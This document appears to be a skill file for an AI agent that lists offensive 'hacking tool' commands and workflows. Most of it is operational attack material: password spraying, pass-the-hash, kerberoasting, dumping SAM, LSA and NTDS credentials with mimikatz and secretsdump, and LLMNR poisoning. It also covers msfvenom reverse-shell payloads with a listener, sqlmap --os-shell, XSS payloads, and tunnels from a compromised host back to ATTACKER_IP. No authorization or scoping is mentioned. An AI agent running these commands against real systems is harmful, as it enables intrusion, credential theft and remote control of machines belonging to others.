---
name: tool-mastery
description: Complete reference for all installed hacking tools - usage, flags, and workflows for every tool in the arsenal.
---

# TOOL MASTERY SKILL

Complete operational reference for every installed hacking tool. Use this skill when you need exact commands, flags, or workflows.

## RECONNAISSANCE TOOLS

### subfinder (subdomain enumeration)
```bash
subfinder -d target.com -silent -all -recursive
subfinder -dL domains.txt -o subs.txt
subfinder -d target.com -silent | httpx -silent
```

### amass (attack surface mapping)
```bash
amass enum -passive -d target.com -o amass.txt
amass enum -active -d target.com -brute -w wordlist.txt
amass intel -whois -d target.com
amass db -list
```

### assetfinder (subdomain discovery)
```bash
assetfinder --subs-only target.com
cat domains.txt | assetfinder --subs-only
```

### httpx (HTTP probing)
```bash
httpx -l subs.txt -silent -status-code -title -tech-detect -follow-redirects
httpx -l subs.txt -mc 200,301,302,403 -o live.txt
httpx -l subs.txt -json -o results.json
httpx -l subs.txt -screenshot -screenshot-output screens/
httpx -l subs.txt -probe -ip -cname -asn -cdn
```

### naabu (port scanning)
```bash
naabu -l hosts.txt -top-ports 1000 -o ports.txt
naabu -host target.com -p 1-65535 -rate 1000
naabu -l hosts.txt -exclude-ports 80,443
naabu -l hosts.txt -nmap-cli 'nmap -sV'
```

### nmap (network mapper)
```bash
nmap -sC -sV -T4 target.com
nmap -sC -sV -p- -T4 target.com
nmap -sU --top-ports 100 target.com
nmap -p 445 --script smb-enum-shares,smb-enum-users target.com
nmap -p 80,443 --script http-enum,http-headers,http-title target.com
nmap -sn 192.168.1.0/24
nmap -sV --version-intensity 9 -p 1-1000 target.com
```

### masscan (mass port scanning)
```bash
masscan 192.168.1.0/24 -p1-65535 --rate=1000 -oL masscan.txt
masscan target.com -p80,443,8080,8443 --rate=10000
```

### dnsx (DNS probing)
```bash
dnsx -l subs.txt -a -aaaa -cname -mx -ns -txt -soa
dnsx -l subs.txt -resp -silent
dnsx -l subs.txt -a -resp-only -o resolved.txt
dnsx -l subs.txt -ptr -silent
```

### katana (web crawler)
```bash
katana -u target.com -d 3 -jc -kf all
katana -u target.com -d 5 -silent -o urls.txt
katana -list urls.txt -d 2 -jc -kf -aff
katana -u target.com -ef css,png,jpg,gif,svg,woff
```

### gau (get all URLs)
```bash
gau target.com --subs --threads 5
gau target.com --subs | grep -E '\.js$|\.json$|\.php$'
gau target.com --subs --blacklist png,jpg,gif
```

### waybackurls (wayback machine)
```bash
cat subs.txt | waybackurls | sort -u
waybackurls target.com | grep -E '\.js$|\.php\?|\.asp\?'
```

### hakrawler (web crawler)
```bash
echo target.com | hakrawler -d 3 -subs -insecure
hakrawler -url target.com -depth 3 -plain
```

### hakrevdns (reverse DNS)
```bash
cat ips.txt | hakrevdns -t 100
echo 8.8.8.8 | hakrevdns
```

### gowitness (screenshots)
```bash
gowitness file -f urls.txt -P screens/
gowitness scan -u https://target.com -P screens/
gowitness report generate -P screens/
```

### uncover (search engine discovery)
```bash
uncover -q 'title:"target" && country:US' -e shodan,censys
uncover -q 'ssl.cert.subject.cn:target.com' -e shodan -silent
```

### mapcidr (CIDR expansion)
```bash
mapcidr -cidr 192.168.1.0/24 -o ips.txt
mapcidr -cidr 192.168.1.0/24 -aggregate
mapcidr -l cidrs.txt -silent
```

### asnmap (ASN mapping)
```bash
asnmap -i 1.2.3.4
asnmap -a ASN12345
asnmap -d target.com
asnmap -l asns.txt -o asn_results.txt
```

### tlsx (TLS certificate grabber)
```bash
tlsx -l hosts.txt -san -cn -silent
tlsx -u target.com -san -cn -so -silent
tlsx -l hosts.txt -expired -silent
```

### urlfinder (URL discovery)
```bash
urlfinder -d target.com -all -silent
urlfinder -d target.com -subs -o urls.txt
```

### alterx (subdomain permutation)
```bash
alterx -l subs.txt -silent -o perms.txt
alterx -d target.com -p 100 -silent
```

### shuffledns (mass DNS resolver)
```bash
shuffledns -d target.com -w wordlist.txt -r resolvers.txt
shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o resolved.txt
```

### cdncheck (CDN detection)
```bash
cdncheck -i 1.2.3.4
cdncheck -l ips.txt -silent
```

### dnsrecon (DNS enumeration)
```bash
dnsrecon -d target.com -t std
dnsrecon -d target.com -t brt -D wordlist.txt
dnsrecon -d target.com -t axfr
dnsrecon -d target.com -t zonewalk
```

### fierce (DNS reconnaissance)
```bash
fierce --domain target.com
fierce --domain target.com --wordlist wordlist.txt
```

### theHarvester (OSINT)
```bash
theHarvester -d target.com -b all
theHarvester -d target.com -b google,linkedin,github
theHarvester -d target.com -l 500 -b all
```

### sherlock (username enumeration)
```bash
sherlock username
sherlock username --timeout 5
sherlock -u username1 username2
```

## WEB APPLICATION TOOLS

### ffuf (web fuzzer)
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3
ffuf -u https://target.com/api/FUZZ -w params.txt -X POST -d '{"key":"FUZZ"}'
ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234 -fc 404
ffuf -u https://target.com/FUZZ -w wordlist.txt -t 100 -rate 1000
ffuf -u https://target.com/FUZZ -w wordlist.txt -H "Cookie: session=abc"
ffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080
```

### gobuster (directory busting)
```bash
gobuster dir -u https://target.com -w wordlist.txt -t 50
gobuster dir -u https://target.com -w wordlist.txt -x php,html,txt
gobuster dns -d target.com -w subdomains.txt
gobuster vhost -u https://target.com -w vhosts.txt
```

### feroxbuster (content discovery)
```bash
feroxbuster -u https://target.com -w wordlist.txt
feroxbuster -u https://target.com -x php,html -t 50
feroxbuster -u https://target.com --recursion --depth 5
feroxbuster -u https://target.com -C 404 -S 301
```

### dirb (directory brute forcer)
```bash
dirb https://target.com
dirb https://target.com /usr/share/wordlists/dirb/common.txt
dirb https://target.com -X .php,.html
```

### nuclei (vulnerability scanner)
```bash
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -severity critical,high
nuclei -l urls.txt -t ~/.local/nuclei-templates/ -severity critical,high,medium
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -tags sqli,xss,ssrf
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -exclude-tags dos,fuzz
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -json -o results.json
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -rate-limit 100
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -headless
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -stats -si 30
nuclei -update-templates
```

### nikto (web server scanner)
```bash
nikto -h https://target.com
nikto -h https://target.com -p 443 -ssl
nikto -h https://target.com -Cgidirs all
nikto -h https://target.com -Format html -o report.html
```

### sqlmap (SQL injection)
```bash
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D database --tables
sqlmap -u "https://target.com/page?id=1" -D database -T table --dump
sqlmap -r request.txt --batch
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" --level=5 --risk=3
sqlmap -u "https://target.com/page?id=1" --os-shell
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment
sqlmap -u "https://target.com/page?id=1" --proxy=http://127.0.0.1:8080
```

### dalfox (XSS scanner)
```bash
dalfox url "https://target.com/page?q=test"
dalfox file urls.txt --blind "callback.xss.ht"
dalfox url "https://target.com/page?q=test" --custom-payload "'\"><script>alert(1)</script>"
dalfox url "https://target.com/page?q=test" --cookie "session=abc"
dalfox url "https://target.com/page?q=test" --proxy http://127.0.0.1:8080
```

### wpscan (WordPress scanner)
```bash
wpscan --url https://target.com --enumerate u,vp,vt
wpscan --url https://target.com --api-token API_KEY
wpscan --url https://target.com --passwords wordlist.txt --usernames admin
wpscan --url https://target.com --plugins-detection aggressive
```

### whatweb (technology fingerprinting)
```bash
whatweb https://target.com
whatweb https://target.com --aggression 3
whatweb -l urls.txt
```

### wafw00f (WAF detection)
```bash
wafw00f https://target.com
wafw00f https://target.com -a
```

### gf (grep patterns)
```bash
cat urls.txt | gf sqli
cat urls.txt | gf xss
cat urls.txt | gf ssrf
cat urls.txt | gf redirect
cat urls.txt | gf interestingparams
cat urls.txt | gf debug-pages
```

### qsreplace (query string replacement)
```bash
cat urls.txt | qsreplace '"><script>alert(1)</script>'
cat urls.txt | qsreplace http://attacker.com
cat urls.txt | qsreplace FUZZ | grep FUZZ
```

### httprobe (HTTP probing)
```bash
cat hosts.txt | httprobe
cat hosts.txt | httprobe -c 50
cat hosts.txt | httprobe -t 3000
```

## NETWORK / ACTIVE DIRECTORY TOOLS

### netexec (network exploitation)
```bash
# SMB enumeration
netexec smb 192.168.1.0/24
netexec smb 192.168.1.10 -u user -p pass
netexec smb 192.168.1.10 -u user -p pass --shares
netexec smb 192.168.1.10 -u user -p pass --users
netexec smb 192.168.1.10 -u user -p pass --sessions
netexec smb 192.168.1.10 -u user -p pass --disks
netexec smb 192.168.1.10 -u user -p pass -M mimikatz
netexec smb 192.168.1.10 -u user -p pass --sam
netexec smb 192.168.1.10 -u user -p pass --lsa
netexec smb 192.168.1.10 -u user -p pass --ntds

# Password spraying
netexec smb 192.168.1.0/24 -u users.txt -p 'Password123!'
netexec smb 192.168.1.0/24 -u user -p passwords.txt
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# Pass the hash
netexec smb 192.168.1.10 -u user -H NTLM_HASH
netexec smb 192.168.1.10 -u user -H NTLM_HASH --shares

# LDAP
netexec ldap 192.168.1.10 -u user -p pass --users
netexec ldap 192.168.1.10 -u user -p pass --groups
netexec ldap 192.168.1.10 -u user -p pass --trusted-for-delegation
netexec ldap 192.168.1.10 -u user -p pass --kerberoast output.txt
netexec ldap 192.168.1.10 -u user -p pass --asreproast output.txt
netexec ldap 192.168.1.10 -u user -p pass -M bloodhound

# WinRM
netexec winrm 192.168.1.10 -u user -p pass
netexec winrm 192.168.1.10 -u user -H NTLM_HASH

# MSSQL
netexec mssql 192.168.1.10 -u user -p pass
netexec mssql 192.168.1.10 -u user -p pass -M mssql_priv
```

### responder (LLMNR/NBT-NS poisoning)
```bash
responder -I eth0 -wrf
responder -I eth0 -A
responder -I eth0 -wrf -v
responder -I eth0 -F -wrf
```

### mitm6 (IPv6 MITM)
```bash
mitm6 -d domain.com
mitm6 -d domain.com -i eth0
mitm6 -d domain.com -hw 00:11:22:33:44:55
```

### enum4linux (SMB enumeration)
```bash
enum4linux -a 192.168.1.10
enum4linux -U 192.168.1.10
enum4linux -S 192.168.1.10
enum4linux -P 192.168.1.10
enum4linux -G 192.168.1.10
```

### smbclient (SMB client)
```bash
smbclient -L //192.168.1.10 -U user
smbclient //192.168.1.10/share -U user
smbclient //192.168.1.10/share -U user -c "get file.txt"
smbclient //192.168.1.10/share -U user -c "put payload.exe"
smbclient //192.168.1.10/share -U user -c "recurse; ls"
```

### hydra (password brute forcing)
```bash
hydra -l admin -P wordlist.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l admin -P wordlist.txt 192.168.1.10 ssh
hydra -l admin -P wordlist.txt 192.168.1.10 ftp
hydra -l admin -P wordlist.txt 192.168.1.10 smb
hydra -l admin -P wordlist.txt 192.168.1.10 rdp
hydra -l admin -P wordlist.txt 192.168.1.10 mysql
hydra -L users.txt -P passwords.txt 192.168.1.10 http-get /admin
```

### john (password cracking)
```bash
john --wordlist=wordlist.txt hash.txt
john --format=nt hash.txt
john --show hash.txt
john --incremental hash.txt
john --rules=all --wordlist=wordlist.txt hash.txt
```

### hashcat (GPU cracking)
```bash
hashcat -m 1000 hash.txt wordlist.txt  # NTLM
hashcat -m 13100 hash.txt wordlist.txt # Kerberoast
hashcat -m 18200 hash.txt wordlist.txt # AS-REP
hashcat -m 5600 hash.txt wordlist.txt  # NetNTLMv2
hashcat -m 0 hash.txt wordlist.txt     # MD5
hashcat -m 100 hash.txt wordlist.txt   # SHA1
hashcat -m 3200 hash.txt wordlist.txt  # bcrypt
hashcat -m 22000 hash.txt wordlist.txt # WPA-PBKDF2
```

### kerbrute (Kerberos brute force)
```bash
kerbrute userenum --dc 192.168.1.10 -d domain.com users.txt
kerbrute passwordspray --dc 192.168.1.10 -d domain.com users.txt 'Password123!'
kerbrute bruteuser --dc 192.168.1.10 -d domain.com passwords.txt admin
kerbrute bruteforce --dc 192.168.1.10 -d domain.com users.txt passwords.txt
```

### ldapdomaindump (LDAP dump)
```bash
ldapdomaindump -u 'domain\user' -p 'pass' 192.168.1.10
ldapdomaindump -u 'domain\user' -p 'pass' -o output/ 192.168.1.10
```

### pypykatz (Mimikatz in Python)
```bash
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam SAM --security SECURITY --system SYSTEM
pypykatz live memory
```

### ldeep (LDAP enumeration)
```bash
ldeep ldap -u user -p pass -d domain.com -s ldap://192.168.1.10 search "(&(objectClass=user))"
ldeep ldap -u user -p pass -d domain.com -s ldap://192.168.1.10 dump
ldeep ldap -u user -p pass -d domain.com -s ldap://192.168.1.10 search "(objectClass=computer)"
```

### impacket-secretsdump (AD secrets)
```bash
impacket-secretsdump domain/user:pass@192.168.1.10
impacket-secretsdump -hashes :NTLM_HASH domain/user@192.168.1.10
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
impacket-secretsdump -just-dc domain/user:pass@192.168.1.10
impacket-secretsdump -just-dc-ntlm domain/user:pass@192.168.1.10
```

### chisel (TCP tunneling)
```bash
# Server (attacker)
chisel server --reverse --port 8080
# Client (compromised host)
chisel client ATTACKER_IP:8080 R:socks
# Then use proxychains
proxychains nmap -sT -Pn 10.10.10.10
```

### ligolo (pivoting)
```bash
# Proxy (attacker)
ligolo-proxy -selfcert
# Agent (compromised host)
ligolo-agent -connect ATTACKER_IP:11601 -retry
# In proxy console
session
start --tun ligolo
# Route
ip route add 10.10.10.0/24 dev ligolo
```

### proxify (HTTP proxy)
```bash
proxify -p 127.0.0.1:8888
proxify -p 127.0.0.1:8888 -x socks5://127.0.0.1:9050
proxify -p 127.0.0.1:8888 -o proxy.log
```

### arp-scan (ARP scanner)
```bash
arp-scan --local
arp-scan 192.168.1.0/24
arp-scan -I eth0 192.168.1.0/24
```

## EXPLOITATION TOOLS

### msfconsole (Metasploit)
```bash
msfconsole -q
# In console
search exploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
# Generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f python -o shell.py
```

### searchsploit (ExploitDB)
```bash
searchsploit apache 2.4
searchsploit -m 12345
searchsploit --exclude="dos"
searchsploit wordpress plugin
```

### gdb (debugger)
```bash
gdb -q ./binary
# In gdb
info functions
disassemble main
break *0x4011b0
run < payload.txt
x/20x $rsp
info registers
continue
```

### radare2 (reverse engineering)
```bash
r2 ./binary
# In r2
aaa
afl
pdf @ main
s main
px 64
izz
V
```

### ROPgadget (ROP chains)
```bash
ROPgadget --binary ./binary
ROPgadget --binary ./binary --ropchain
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --depth 5
```

### one_gadget (one gadget RCE)
```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget libc.so.6 --level 2
```

### strace (system call tracer)
```bash
strace -f ./binary
strace -e trace=execve ./binary
strace -e trace=network ./binary
strace -p PID
```

### objdump (binary analysis)
```bash
objdump -d ./binary
objdump -t ./binary
objdump -s -j .rodata ./binary
objdump -M intel -d ./binary
```

### readelf (ELF analysis)
```bash
readelf -h ./binary
readelf -l ./binary
readelf -s ./binary
readelf -d ./binary
readelf -r ./binary
```

### strings (extract strings)
```bash
strings ./binary
strings -n 8 ./binary
strings -e l ./binary
strings -a ./binary
```

### exiftool (metadata)
```bash
exiftool file.jpg
exiftool -a -u file.pdf
exiftool -all= file.jpg
```

### binwalk (firmware analysis)
```bash
binwalk firmware.bin
binwalk -e firmware.bin
binwalk -Me firmware.bin
binwalk -A firmware.bin
```

## FORENSICS / BLUE TEAM TOOLS

### tshark (packet analysis)
```bash
tshark -r capture.pcap
tshark -r capture.pcap -Y "http.request"
tshark -r capture.pcap -Y "dns"
tshark -r capture.pcap -Y "tcp.port==80"
tshark -r capture.pcap -T fields -e ip.src -e ip.dst
tshark -r capture.pcap -z "follow,tcp,ascii,0"
tshark -i eth0 -w capture.pcap
```

### tcpdump (packet capture)
```bash
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80
tcpdump -i eth0 host 192.168.1.10
tcpdump -i eth0 -nn -s0
tcpdump -r capture.pcap -A
```

### volatility3 (memory forensics)
```bash
vol -f memory.dump windows.info
vol -f memory.dump windows.pslist
vol -f memory.dump windows.psscan
vol -f memory.dump windows.netscan
vol -f memory.dump windows.cmdline
vol -f memory.dump windows.malfind
vol -f memory.dump windows.hashdump
vol -f memory.dump windows.dumpfiles
```

### yara (malware detection)
```bash
yara rules.yar file.exe
yara -r rules/ directory/
yara -s rules.yar file.exe
yara -w rules.yar file.exe
```

### gitleaks (secret scanning)
```bash
gitleaks detect --source .
gitleaks detect --source . --report-format json --report-path report.json
gitleaks git --remote https://github.com/user/repo
gitleaks dir /path/to/dir
```

### notify (notifications)
```bash
echo "message" | notify
cat results.txt | notify -provider-config config.yaml
```

### interactsh-client (OOB interaction)
```bash
interactsh-client -v
interactsh-client -o interactions.log
interactsh-client -server interact.sh
```

## WORKFLOWS

### Full recon pipeline
```bash
# 1. Subdomain enumeration
subfinder -d target.com -silent -all | anew subs.txt
amass enum -passive -d target.com | anew subs.txt
assetfinder --subs-only target.com | anew subs.txt

# 2. Permutation
alterx -l subs.txt -silent | shuffledns -r resolvers.txt -silent | anew subs.txt

# 3. Resolve and probe
dnsx -l subs.txt -a -resp-only -silent | anew ips.txt
httpx -l subs.txt -silent -status-code -title -tech-detect -o live.txt

# 4. Port scan
naabu -l ips.txt -top-ports 1000 -o ports.txt

# 5. Crawl and collect URLs
katana -list live.txt -d 3 -jc -silent | anew urls.txt
gau --subs target.com | anew urls.txt

# 6. Vulnerability scan
nuclei -l live.txt -t ~/.local/nuclei-templates/ -severity critical,high

# 7. Screenshots
gowitness file -f live.txt -P screens/
```

### Web app testing workflow
```bash
# 1. Fingerprint
whatweb https://target.com
wafw00f https://target.com

# 2. Content discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# 3. Parameter discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200

# 4. Vulnerability scan
nuclei -u https://target.com -t ~/.local/nuclei-templates/ -severity critical,high
nikto -h https://target.com

# 5. Injection testing
sqlmap -u "https://target.com/page?id=1" --batch --level=3
dalfox url "https://target.com/page?q=test"

# 6. Filter interesting params
cat urls.txt | gf sqli | qsreplace "1' OR '1'='1"
```

### AD attack workflow
```bash
# 1. Enumerate
enum4linux -a 192.168.1.10
netexec smb 192.168.1.10 -u user -p pass --users --groups --shares

# 2. Kerberoast
netexec ldap 192.168.1.10 -u user -p pass --kerberoast output.txt
hashcat -m 13100 output.txt wordlist.txt

# 3. AS-REP Roast
netexec ldap 192.168.1.10 -u user -p pass --asreproast output.txt
hashcat -m 18200 output.txt wordlist.txt

# 4. BloodHound
netexec ldap 192.168.1.10 -u user -p pass -M bloodhound

# 5. Pass the hash
netexec smb 192.168.1.10 -u admin -H NTLM_HASH
impacket-psexec -hashes :NTLM_HASH domain/admin@192.168.1.10

# 6. Dump secrets
impacket-secretsdump domain/user:pass@192.168.1.10
```

## OUTPUT FORMAT
```
[TOOL] Tool name
[COMMAND] Exact command used
[OUTPUT] Key results
[ANALYSIS] Interpretation
```